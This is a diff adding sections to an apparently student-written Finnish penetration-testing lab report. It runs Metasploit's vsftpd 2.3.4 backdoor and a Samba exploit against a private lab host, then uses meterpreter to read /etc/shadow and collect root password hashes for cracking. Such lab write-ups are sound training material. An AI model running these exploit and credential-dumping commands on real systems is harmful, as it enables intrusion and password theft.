@@ -210,3 +210,158 @@ Kerätyt tiedot ovat hyödyllisiä jatkohyökkäyksissä:
 - Järjestelmätiedot (OS, arkkitehtuuri) auttavat valitsemaan oikeat exploitit ja payloadit myöhempää käyttöä varten.
 
 Yhteenvetona: nämä komennot (sysinfo, getuid, ifconfig) muodostavat perustan post‑exploitation‑vaiheelle, jossa hyökkääjä kartoittaa kohteen ja valmistautuu jatkotoimiin.
+
+
+## h) Murtaudu jollain toisella tavalla
+
+Valitsin Samban, koska olin aikaisemmin jo analysoinut sen mielenkiintoiseksi. 
+
+Aloitin komennolla:
+
+```bash
+search samba
+```
+
+Sieltä löysin: 
+
+<img width="358" height="28" alt="image" src="https://github.com/user-attachments/assets/77912dd2-5bf4-4b37-9c15-855a93747d6f" />
+
+Jonka jälkeen komennot olivat samat kuin ftp:n murtamisessa.
+*Lisäyksenä laitoin: set RPORT 139, koska samba oli kahdessa eri portissa (139, 445) ja scripti toimii vain vanhemmassa versiossa eli 139 portissa.
+
+<img width="924" height="782" alt="image" src="https://github.com/user-attachments/assets/a75729c5-d50d-46b5-84a6-4c1893811c95" />
+
+## i) Demonstroi Meterpreterin ominaisuuksia
+
+Avasin meterpreter-sessionin FTP-haavoittuvuuden kautta ja testasin sen keskeisiä ominaisuuksia. Meterpreter tarjoaa monipuolisia työkaluja, joiden avulla hyökkääjä kykenee keräämään tietoa, hallita järjestelmää ja valmistella jatkohyökkäyksiä.
+
+#### Järjestelmätiedot
+Komento:
+
+<img width="420" height="97" alt="image" src="https://github.com/user-attachments/assets/3d107624-8eab-4bc7-8064-f5f27a04af50" />
+
+Tällä sain näkyviin käyttöjärjestelmän version, arkkitehtuurin ja hostnamen.
+
+#### Käyttäjätaso
+Komento:
+
+<img width="185" height="36" alt="image" src="https://github.com/user-attachments/assets/bcfc881a-d0c5-4708-ada5-658bce0cdcf9" />
+
+Tuloste osoitti, että sessioni oli root-tasolla, mikä antaa täyden hallinnan kohdekoneeseen.
+
+#### Prosessien tarkastelu
+Komento:
+
+<img width="538" height="810" alt="image" src="https://github.com/user-attachments/assets/cae89843-853f-4625-9fb8-4dbab2cd55ac" />
+
+Prosessilista paljastaa käynnissä olevat palvelut. Näitä voidaan hyödyntää jatkohyökkäyksissä.
+
+#### Tiedostojen selaaminen
+Komennot:
+
+```bash
+ls
+cd /etc
+cat shadow
+```
+
+<img width="508" height="612" alt="image" src="https://github.com/user-attachments/assets/325411fe-6b4e-4d95-820a-01745f84ec1c" />
+
+Meterpreter antoi näkyviin salasanojen hash-tiedot, mikä on mahdollista vain, koska sessioni oli root-tasolla.
+Tämä osoittaa, että Meterpreter mahdollistaa pääsyn järjestelmän arkaluonteisiin tietoihin, joita voidaan hyödyntää esimerkiksi offline-salasanamurtamiseen (Hashcat)
+
+### Yhteenveto
+
+Meterpreter tarjoaa tehokkaita post-exploitation-ominaisuuksia:
+
+- Järjestelmätietojen keruu
+- Käyttäjätason tarkistus
+- Prosesien analysointi
+- Tiedostojen lukeminen
+
+
+## j) Tallenna shell-sessio tekstitiedostoon.
+
+Tässä tavoitteena oli tallentaa koko Metasploit- ja meterpreter-session komennot sekä tulosteet lokitiedostoon. Toteutin tämän Linuxin script-työkalulla, joka tallentaa kaiken terminaalissa näkyvän tekstin.
+
+#### Lokituksen käynnistäminen
+
+```bash
+script -fa log001.txt
+```
+
+*Parametrit:*
+- "-f": flushaa tulosteen välittömästi tiedostoon
+- "-a": lisää tiedostoon eli ei ylikirjoita aiempaa sisältöä.
+
+Tämän jälkeen kaikki tallentuu automaattisesti *log001.txt*-tiedostoon.
+
+### Session avaaminen ja komentojen suorittaminen
+
+```bash
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.56.102
+set LHOST 192.168.56.101
+run
+sysinfo
+getuid
+cat /etc/shadow
+exit
+exit
+```
+
+Viimeinen *exit* lopettaa script-työkalun ja tallentaa lokitiedoston
+
+### Lokitiedoston tarkistus
+
+```bash
+cat log001.txt
+```
+
+<img width="944" height="812" alt="image" src="https://github.com/user-attachments/assets/43029f86-e374-45d0-8c07-04163527decd" />
+
+<img width="940" height="811" alt="image" src="https://github.com/user-attachments/assets/12bc3d69-4bf5-4748-8cfa-46f16f6f8580" />
+
+Tiedosto sisälsi koko istunnon alusta loppuun niin kuin toivottiin.
+
+## k) Pivot point.
+
+Loin pivot kansion ja siirsin tiedostot aikaisemmista tehtävistä sinne.
+
+<img width="213" height="241" alt="image" src="https://github.com/user-attachments/assets/0c9b05e7-1757-4b65-a4ac-6d54cd55c5c3" />
+
+<img width="337" height="114" alt="image" src="https://github.com/user-attachments/assets/3cc8ee1f-174c-4bc2-bd02-deff43b95136" />
+
+### Esimerkkikysymys:
+
+Haluan root-käyttäjän salasanahashin Hashcat-murtamista varten. Mistä tiedostosta löydän sen?
+
+```bash
+grep -r "root" /pivot
+```
+
+<img width="938" height="287" alt="image" src="https://github.com/user-attachments/assets/994cf3af-7875-4867-a378-96c29d80198c" />
+
+Kuvan alareunassa näemme rootin salasanan hash muodossa.
+
+## i) Attaack!
+
+Harjoituksessa käyin useita MITRE ATT&CK-viitekehyksen taktiikoita ja tekniikoita, jotka kuvaa hyökkäyksen etenemistä vaiheittain.
+
+- **Reconnaissance:** *Active Scanning:* nmap-skannaus, db_nmap tallennus, palveluiden kartoitus
+- **Initial Access:** *Exploit Public-Facing Application:* vsftpd 2.3.4 backdoorin hyödyntäminen
+- **Execution:** *Command and Scripting Interpreter:* meterpreter-komennot kuten "sysinfo", "getuid".
+- **Privilige Escalation:** *Exploitation for Privilige Excalation:* root-tason pääsy haavoittuvuuden kautta.
+- **Discovery:** *System Information Discovery:* Järjestelmän tunnistus
+- **Credential Access:** *OS Credential Dumping:* salasanahashien hakeminen "/etc/shadow"-tiedostosta.
+- **Lateral Movement:** *Remote Services:* tunnistettujen palveluiden (SSH, Samba, MySQL) hyödyntäminen mahdolliseen levittäytymiseen.
+- **Collection:** *Data from Local System:* hashien ja järjestelmätietojen kerääminen lokitiedostoon.
+- **Exfiltration:** *Exfiltration Over C2 Channel:* tietojen siirto hyökkääjän koneelle meterpreter-sessionin kautta.
+- **Impact:** *Data Manipulation:* kohteen tiedostojen lukeminen ja muokkaus root-oikeuksilla.
+
+### Lähteet
+- [Jaswal 2020: *Mastering Metasploit - Fourth Edition*, Chapter 1: Approaching a Penetration Test Using Metasploit](https://www.oreilly.com/library/view/mastering-metasploit/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idParaDest-31)
+- [Metasploit Framework Documentation](https://docs.metasploit.com/)
+- [Nmap: Reference Guide](https://nmap.org/book/man.html)
+- [MITTRE ATT&CK Framework](
